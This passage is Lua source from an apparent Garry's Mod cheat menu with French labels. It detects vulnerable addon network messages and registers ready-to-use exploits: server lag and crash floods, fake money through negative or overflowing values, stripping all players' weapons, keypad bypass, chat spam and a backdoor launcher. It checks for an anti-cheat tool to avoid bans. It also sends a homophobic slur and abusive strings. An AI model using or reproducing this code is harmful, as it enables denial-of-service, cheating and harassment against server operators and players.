surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
local stuff = {

}
net.Start("D3A_Message")
net.WriteString("FAGGOTS")
net.WriteTable(stuff)
net.SendToServer()
end )
end

status = ValidNetString("misswd_accept")
if (status) then
CHATPRINT("Exploit Trouvé : Misswd Accepter [misswd_accept]")
addExploit( "247","Misswd Accepter", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
for i = 0, 100 do
net.Start("misswd_accept")
net.WriteEntity(v)
net.SendToServer()
end
end
end )
end

status = ValidNetString("ScannerMenu")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit De Scanneur [ScannerMenu]")
addExploit( "248","Exploit De Scanneur", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("ScannerMenu")
net.WriteEntity(v)
net.WriteFloat(1)
net.WriteFloat(1)
net.SendToServer()
end
end )
end

status = ValidNetString("ORG_NewOrg")
if (status) then
CHATPRINT("Exploit Trouvé : Nouvelle Organisation [ORG_NewOrg]")
addExploit( "249","Nouvelle Organisation", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("ORG_NewOrg")
net.WriteString("I FUCKING HATE YOU!")
net.SendToServer()
end )
end

status = ValidNetString("ORG_VaultDonate")
if (status) then
CHATPRINT("Exploit Trouvé : Argent Gratuite #27 [ORG_VaultDonate]")
addExploit( "250","Argent Gratuite #27", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("ORG_VaultDonate")
net.WriteFloat(-1000000000000000000000000000000000000000000000000000000)
net.SendToServer()
end )
end

status = ValidNetString("Selldatride")
if (status) then
CHATPRINT("Exploit Trouvé : Vendre Datride [Selldatride]")
addExploit( "251","Vendre Datride", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(player.GetAll()) do
net.Start("Selldatride")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("passmayorexam")
if (status) then
CHATPRINT("Exploit Trouvé : Passez Les Examens [passmayorexam]")
addExploit( "252","Passez Les Examens", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("passmayorexam")
net.SendToServer()
end )
end

status = ValidNetString("levelup_useperk")
if (status) then
CHATPRINT("Exploit Trouvé : Augmentez De Niveau [levelup_useperk]")
addExploit( "253","Augmentez De Niveau", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("levelup_useperk")
net.WriteInt(1, 8)
net.WriteInt(2, 8)
net.WriteInt(3, 8)
net.WriteInt(4, 8)
net.SendToServer()
end )
end

status = ValidNetString("DeployMask")
if (status) then
CHATPRINT("Exploit Trouvé : Mettre Un Masque A Gaz A Tout Les Joueurs [DeployMask]")
addExploit( "255","Mettre Un Masque A Gaz A Tout Les Joueurs", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(ents.GetAll()) do
net.Start("DeployMask")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("RemoveMask")
if (status) then
CHATPRINT("Exploit Trouvé : Supprimer Les Masques A Gaz Des Joueurs [RemoveMask]")
addExploit( "256","Supprimer Les Masques A Gaz Des Joueurs", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(ents.GetAll()) do
net.Start("RemoveMask")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("SwapFilter")
if (status) then
CHATPRINT("Exploit Trouvé : Changer Tout Les Filtres Des Masques A Gaz [SwapFilter]")
addExploit( "257","Changer Tout Les Filtres Des Masques A Gaz", "Changer Les Filtres Des Masques A Gaz", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(ents.GetAll()) do
net.Start("SwapFilter")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("WipeMask")
if (status) then
CHATPRINT("Exploit Trouvé : Essuyez Les Masques A Gaz [WipeMask]")
addExploit( "258","Essuyez Les Masques A Gaz", "Exploit Pour Essuyez Tout Les Masques A Gaz", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(ents.GetAll()) do
net.Start("WipeMask")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("UseMedkit")
if (status) then
CHATPRINT("Exploit Trouvé : Utiliser Le Kit Médical [UseMedkit]")
addExploit( "259","Utiliser Le Kit Médical", "Exploit Pour Utiliser Le Kit Médical Sur Tout Le Monde", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(ents.GetAll()) do
net.Start("UseMedkit")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("IDInv_RequestBank")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #23 [IDInv_RequestBank]")
addExploit( "260","Crée Des Lags #23", "Exploit Provenant De L'addon 'IDinventory'", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
if !timer.Exists("lagger23") then
timer.Create("lagger23", 0, 0, function()
for i = 1, 1000 do
net.Start("IDInv_RequestBank",true)
net.SendToServer()
end
end )
end
end )
end

status = ValidNetString("casinokit_chipexchange")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #24 [casinokit_chipexchange]")
addExploit( "261","Crée Des Lags #24", "Exploit Provenant De L'addon 'CasinoKit'", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
if !timer.Exists("lagger24") then
timer.Create("lagger24", 0, 0, function()
for i = 1, 1000 do
net.Start("casinokit_chipexchange",true)
net.WriteEntity(LocalPlayer())
net.WriteString("darkrp")
net.WriteBool(false)
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999,32)
net.SendToServer()
end
end )
end
end )
end

status = ValidNetString("RemoveTag")
if (status) then
CHATPRINT("Exploit Trouvé : 1tap Le Serveur [RemoveTag]")
addExploit( "262","1tap Le Serveur", "Coup dûr pour le serveur ducoup", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("1tap", 0.5, 0, function()
for i=1, 4000 do
net.Start("RemoveTag")
net.WriteFloat(9999999999999999999999999999999999999999999999999999999999)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("desktopPrinter_Withdraw")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #25 [desktopPrinter_Withdraw]")
addExploit( "263","Crée Des Lags #25", "Exploit Provenant De L'addon 'Desktop Printers'", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
if !timer.Exists("lagger25") then
timer.Create("lagger25", 0, 0, function()
for i = 1, 1000 do
net.Start("desktopPrinter_Withdraw",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end
end )
end

status = ValidNetString("sphys_dupe")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #26 [sphys_dupe]")
addExploit( "264","Crée Des Lags #26", "Exploit Provenant De L'addon 'Simfphys'", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger26", 0.2, 0, function()
for i=1,2200 do
net.Start("sphys_dupe",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("simfphys_gasspill")
if (status) then
CHATPRINT("Exploit Trouvé : Chiez Sur Les Joueurs [simfphys_gasspill]")
addExploit( "265","Chiez Sur Les Joueurs", "Exploit Provenant De L'addon 'Simfphys'", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("poop", 0.1, 0, function()
for k,v in pairs(player.GetAll()) do
for j=1,3 do
if IsValid(v) then
net.Start("simfphys_gasspill")
net.WriteVector(v:GetPos()+Vector(0,0,90))
net.WriteVector(v:EyePos())
net.SendToServer()
end
end
end
end )
end )
end

status = ValidNetString("dronesrewrite_controldr")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #27 [dronesrewrite_controldr]")
addExploit( "266","Crée Des Lags #27", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger27", 0.2, 0, function()
for i=1,2200 do
net.Start("dronesrewrite_controldr",true)
net.SendToServer()
end
end )
end )
end


status = ValidNetString("SCP-294Sv")
if (status) then
CHATPRINT("Exploit Trouvé : Exploit De SCP-294 [SCP-294Sv]")
addExploit( "267","Exploit De SCP-294 Exploit", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k,v in pairs(ents.GetAll()) do
net.Start("SCP-294Sv")
net.WriteString("acid")
net.WriteEntity(v)
net.SendToServer()
end
end )
end

status = ValidNetString("phone")
if (status) then
CHATPRINT("Exploit Trouvé : Appelez Tous Les Joueurs [phone]")
addExploit( "269","Appelez Tous Les Joueurs", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(player.GetAll()) do
net.Start("phone")
net.WriteTable{
ply=v,
act='call'
}
net.SendToServer()
end
end )
end

status = ValidNetString("blueatm")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #29 [blueatm]")
addExploit( "270","Crée Des Lags #29", "Exploit Provenant De L'addon 'Blue ATM', ", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger29", 0, 0, function()
for i = 1, 1000 do
net.Start("blueatm",true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("cab_cd_testdrive")
if (status) then
CHATPRINT("Exploit Trouvé : Stavox Teleportation [cab_cd_testdrive]")
addExploit( "271","Stavox Teleportation", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start('cab_cd_testdrive')
net.WriteUInt(0, 3)
net.WriteUInt(5, 8)
net.SendToServer()
end )
end

status = ValidNetString("cab_sendmessage")
if (status) then
CHATPRINT("Exploit Trouvé : Stavox Message [cab_sendmessage]")
addExploit( "272","Stavox Message", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(player.GetAll()) do
net.Start("cab_sendmessage")
net.WriteEntity(v)
net.WriteString("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
net.SendToServer()
end
end )
end

status = ValidNetString("disguise")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #30 [disguise]")
addExploit( "273","Crée Des Lags #30", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger30", 0, 0, function()
for i = 1, 1000 do
net.Start("disguise",true)
net.WriteInt(9999999999999999999999999999999999999999999999999999999999, 32)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("FARMINGMOD_DROPITEM")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #31 [FARMINGMOD_DROPITEM]")
addExploit( "274","Crée Des Lags #31", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger31", 0, 0, function()
for i = 1, 1000 do
net.Start("FARMINGMOD_DROPITEM",true)
net.WriteInt(9999999999999999999999999999999999999999999999999999999999, 16)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("SlotsRemoved")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #32 [SlotsRemoved]")
addExploit( "275","Crée Des Lags #32", "Exploit Provenant De L'addon 'PointShop 2 Perma Weapons', ", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger32", 0, 0, function()
for i = 1, 1000 do
net.Start("SlotsRemoved",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("AirDrops_StartPlacement")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #33 [AirDrops_StartPlacement]")
addExploit( "276","Crée Des Lags #33", "Exploit Provenant De L'addon 'PointShop 2 AirDrops'", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger33", 0, 0, function()
for i = 1, 1000 do
net.Start("AirDrops_StartPlacement",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("IGS.GetPaymentURL")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #35 [IGS.GetPaymentURL]")
addExploit( "278","Crée Des Lags #35", "Exploit Dans IGS", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger35", 0, 0, function()
for i = 1, 1000 do
net.Start("IGS.GetPaymentURL",true)
net.WriteDouble(9999999999999999999999999999999999999999999999999999999999)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("fg_printer_money")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #36 [fg_printer_money]")
addExploit( "279","Crée Des Lags #36", "Exploits Dans Les FG Printers", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger36", 0, 0, function()
for i = 1, 1000 do
net.Start('fg_printer_money',true)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end )
end )
end

status = ValidNetString("tickbookpayfine")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #37 [tickbookpayfine]")
addExploit( "280","Crée Des Lags #37", "Exploit De Ticket Book", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger37", 0, 0, function()
for i = 1, 1000 do
net.Start("tickbookpayfine",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("BeginSpin")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #38 [BeginSpin]")
addExploit( "281","Crée Des Lags #38", "Exploits De Blue Unbox", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger38", 0, 0, function()
for i = 1, 1000 do
net.Start("BeginSpin",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("DuelRequestClient")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #39 [DuelRequestClient]")
addExploit( "282","Crée Des Lags #39", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger39", 0, 0, function()
for i = 1, 1000 do
net.Start("DuelRequestClient",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("ncpstoredoact")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #40 [ncpstoredoact]")
addExploit( "283","Crée Des Lags #40", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger40", 0, 0, function()
for i = 1, 1000 do
net.Start("ncpstoredoact",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("PermwepsNPCSellWeapon")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #41 [PermwepsNPCSellWeapon]")
addExploit( "284","Crée Des Lags #41", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger41", 0, 0, function()
for i = 1, 2000 do
net.Start("PermwepsNPCSellWeapon",true)
net.WriteString("")
net.SendToServer()
end
end )
end )
end

status = ValidNetString("bitcoins_request_withdraw")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #42 [bitcoins_request_withdraw]")
addExploit( "285","Crée Des Lags #42", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("lagger42", 0, 0, function()
for i = 1, 2000 do
net.Start("bitcoins_request_withdraw",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("bitcoins_request_turn_on")
if (status) then
CHATPRINT("Exploit Trouvé : Activé Tout Les Mineurs De Bitcoins [bitcoins_request_turn_on]")
addExploit( "286","Activé Tout Les Mineurs De Bitcoins", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(ents.GetAll()) do
if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
net.Start("bitcoins_request_turn_on")
net.WriteEntity(v)
net.SendToServer()
end
end
end)
end

status = ValidNetString("bitcoins_request_turn_off")
if (status) then
CHATPRINT("Exploit Trouvé : Désactiver Tout Les Mineurs De Bitcoins [bitcoins_request_turn_off]")
addExploit( "287","Désactiver Tout Les Mineurs De Bitcoins", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(ents.GetAll()) do
if v:GetModel() == "models/props_c17/consolebox01a.mdl" then
net.Start("bitcoins_request_turn_off")
net.WriteEntity(v)
net.SendToServer()
end
end
end)
end

status = ValidNetString("NET_AM_MakePotion")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #43 [NET_AM_MakePotion]")
addExploit( "288","Crée Des Lags #43", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger43", 0, 0, function()
for i = 1, 2000 do
net.Start('NET_AM_MakePotion',true)
net.WriteEntity(LocalPlayer())
net.WriteInt(9999999999999999999999999999999999999999999999999999999999, 8)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("minigun_drones_switch")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #44 [minigun_drones_switch]")
addExploit( "289","Crée Des Lags #44", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger44", 0.2, 0, function()
for i=1,2200 do
net.Start("minigun_drones_switch",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("CW20_PRESET_LOAD")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #45 (AVEC DES ARMES CW2 DANS LES MAINS) [CW20_PRESET_LOAD]")
addExploit( "290","Crée Des Lags #45", "(AVEC DES ARMES CW2 DANS LES MAINS)", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger45", 0.2, 0, function()
if(LocalPlayer():GetActiveWeapon():GetClass():find("cw"))then
for i=1,2200 do
net.Start("CW20_PRESET_LOAD",true)
net.SendToServer()
end
end
end )
end )
end

status = ValidNetString("SBP_addtime")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #46 [SBP_addtime]")
addExploit( "291","Crée Des Lags #46", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger46", 0.3, 0, function()
for i=1,2200 do
net.Start("SBP_addtime",true)
net.SendToServer()
end
end )
end )
end

status = ValidNetString("NetData")
if (status) then
CHATPRINT("Exploit Trouvé : Vêtement Bruyant [NetData]")
addExploit( "292","Outfit player nouser", "Entend Les Joueurs Près De Toi", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(player.GetAll()) do
net.Start("NetData")
net.WriteString("OF")
net.WriteUInt(4,8)
net.WriteData(math.random(100000,9999999)..",sis.mdl",30)
net.SendToServer()
end
end )
end

status = ValidNetString("SBP_addtime")
if (status) then
CHATPRINT("Exploit Trouvé : Booster Son XP [SBP_addtime]")
addExploit( "293","Booster Son XP", "", function()
inputFrameExists = true
inputFrame = vgui.Create( "DFrame" )
inputFrame:SetTitle("Enter the number")
inputFrame:SetSize( 400, 75 )
inputFrame:SetPos(ScrW() / 2 - inputFrame:GetWide() / 2, ScrH() / 2 + 230 )
inputFrame:SetDraggable(true)
inputFrame:ShowCloseButton(true)
inputFrame:MakePopup()
inputFrame.Paint = function( self, w, h )
draw.RoundedBox( 5, 0, 0, w, h, Color(30, 30, 30))
end
local TextEntry = vgui.Create( "DTextEntry", inputFrame )
TextEntry:SetSize( 380, 30 )
TextEntry:SetPos( inputFrame:GetWide() / 2 - TextEntry:GetWide() / 2, inputFrame:GetTall() / 2 - TextEntry:GetTall() / 2 )
TextEntry:SetText( "100" )
TextEntry.OnEnter = function( self )
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") timer.Create("ofn", 0.2, 0, function()
for i=1,tonumber(self:GetText()) do
net.Start("SBP_addtime")
net.SendToServer()
end
inputFrame:SetVisible(false)
end )
end
end )
end

status = ValidNetString("StackGhost")
if (status) then
CHATPRINT("Exploit Trouvé : Booter 24000 #1")
addExploit("294", "Booter 24000 #1", "Devient aussi puissant que freezer et adrien", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
if !(timer.Exists("Booteur24000")) then
timer.Create("Booteur24000", 0.02, 0, function()
for i = 1, 2000 do
net.Start("StackGhost", true)
net.WriteInt(69, 32)
net.SendToServer()
end
end)
else
timer.Stop("Booteur24000")
end
end)
end

status = ValidNetString("pac_submit")
if (status) then
CHATPRINT("Exploit Trouvé: Booter 24000 #2")
addExploit("295", "Booter 24000 #2", "Devient aussi puissant que freezer et adrien", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("Booteur240002", 0.02, 0, function()
for i = 1, 1000 do
net.Start("pac_submit")
net.SendToServer()
end
end)
end)
end

status = ValidNetString("RequestMAPSize")
if (status) then
CHATPRINT("Exploit Trouvé : 1tap Le Serveur [MapSize]")
addExploit("296", "1tap Le Serveur [MapSize]", "One shoot un serveur", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger10", 0, 0, function()
for i = 1, 400 do
net.Start("RequestMAPSize")
net.SendToServer()
end
end)
end)
end

status = ValidNetString("properties")
if (status) then
CHATPRINT("Exploit Trouvé : El Famoso Exploit Strip - 99% FIX")
addExploit("297", "Strip Weapon", "Strip weapon tout les joueurs", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
for k, v in pairs(player.GetAll()) do
if v:IsPlayer() then
for k, v in pairs(v:GetWeapons()) do
net.Start("properties")
net.WriteString("remove", 32)
net.WriteEntity(v)
net.SendToServer()
end
end
end
end)
end

status = ValidNetString("start_wd_emp")
if (status) then
CHATPRINT("Exploit Trouvé : Hack Keypad Instantanné")
addExploit("298", "Hack Keypad Instantanné", "Plus rapide que les nouilles instantanné", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start('start_wd_emp')
net.SendToServer()
end)
end

status = ValidNetString("pac.net.TouchFlexes.ClientNotify")
if (status) then
CHATPRINT("Exploit Trouvé : Faire Crash Le Serveur")
addExploit("299", "Faire Crash Le Serveur", "Plutôt Puissant :^)", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("crasher2", 0, 0, function()
for i = 1, 400 do
net.Start("pac.net.TouchFlexes.ClientNotify")
net.WriteInt(9999999999999999999999999999999999999999999999999999999999999999999999, 13)
net.SendToServer()
end
end)
end)
end

status = ValidNetString("ItemStoreDrop")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags Item Store")
addExploit("300", "Crée Des Lags Item Store", "Item store leak c'est pas cool :/", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("booteur24000items", 0, 0, function()
for i = 1, 1000 do
net.Start("ItemStoreDrop")
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
net.WriteUInt(9999999999999999999999999999999999999999999999999999999999, 32)
net.SendToServer()
end
end)
end)
end

status = ValidNetString("TFA_Attachment_RequestAll")
if (status) then
CHATPRINT("Exploit Trouvé : Lags Avec Des Armes TFA")
addExploit("301", "Lags Avec Des Armes TFA", "Oublie pas de porter du TFA", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger20", 0.02, 0, function()
for i = 1, 4400 do
net.Start("TFA_Attachment_RequestAll", true)
net.SendToServer()
end
end)
end)
end

status = ValidNetString("ts_buytitle")
if (status) then
CHATPRINT("Exploit Trouvé : Crée Des Lags #47 [ts_buytitle]")
addExploit("302", "Crée Des Lags #47", "Title Store c'est pas ouf", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
timer.Create("lagger47", 0, 0, function()
for i = 1, 1000 do
net.Start("ts_buytitle", true)
net.WriteTable({})
net.WriteTable({})
net.WriteTable({})
net.SendToServer()
end
end)
end)
end


status = ValidNetString("disaster_enable")
if (status) then
CHATPRINT("Exploit Trouvé : Recevoir Les Easter Eggs 88")
addExploit( "303","Recevoir Les Easter Eggs 88", "", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") RunConsoleCommand("say", "izi")
RunConsoleCommand("88Zilnix")
net.Start("disaster_enable")
net.SendToServer()
--("Vous avez reçu les easter eggs 88 :D")
end)
end

status = ValidNetString("EnterpriseWithdraw")
if (status) then
CHATPRINT("Exploit Trouvé : Entreprise Trouvé! [EnterpriseWithdraw]")
addExploit( "304","Entreprise Trouvé!", "Exploit Du R8 (Soit disant l'un des meilleurs)", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") --("Démarré")
net.Start("EnterpriseWithdraw")
net.WriteInt(100, 32)
net.SendToServer()
end )
end

status = ValidNetString("SetPermaKnife")
if (status) then
CHATPRINT("Exploit Trouvé : Couteau Permanent / Full Acès Serveur [SetPermaKnife]")
addExploit( "305","Couteau Permanent", "Reçois Un Couteau Permanent Ou Un Acès A Tout Sur Le Serveur Avec La Commande gibe_weapon", function()
surface.PlaySound( "mat/ptiycheatclick.wav" ) NOTIFICATION("Exploit lançé") function permaknifepls(ply,cmd,args,argStr)
local ply = LocalPlayer()
net.Start( "SetPermaKnife" )
net.WriteString( string.TrimRight(argStr,".lua") )
net.SendToServer()
end
concommand.Add("gibe_weapon",permaknifepls)
end )
end

print( "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" )
print( "Exploits check" )
print( "Check terminé" )

else
local TextHomeza = vgui.Create( "DPanel", Exploits )
TextHomeza:SetSize(1000,650)
TextHomeza.Paint = function( self, w, h )
draw.SimpleText("SNTE détecté. Risque de ban", "ptiycheat_home3", 330, 235, Color(255, 74, 74,255), 0, 1)
draw.SimpleText("Exploits désactivés", "ptiycheat_home2", 440, 265, Color(255, 255, 255,200), 0, 1)
end
end
end

function BD.QuickFireBackdoor()

if !BD.BDMacros[selectedbackdoor] or selectedbackdoor == "" then NOTIFICATIONNO("Veuillez séléctionner une backdoor présente") return end

if BD.BDMacros[selectedbackdoor].Type == ( 1 or 3 ) then BD.FormatCodeGlobal() else BD.FormatCodeTargeted() end

end

concommand.Add("runbd", BD.QuickFireBackdoor)

/*==========================
|==== Los Famosos Local ====|
==========================*/

local givemeid = LocalPlayer():SteamID()
local ply = LocalPlayer()
local asphyxnet = "";
local n = net
local nr = n.Receive
local s = n.ReadString
local NBRBackdoor = 0
local selectedplayers = {}
local selectedbackdoor = ""



/*=======================
|==== Check Netstring ===|
========================*/

concommand.Add("asnet", function()
local netstrings = {}
for i = 1, 9999 do
local asnet = util.NetworkIDToString( i )
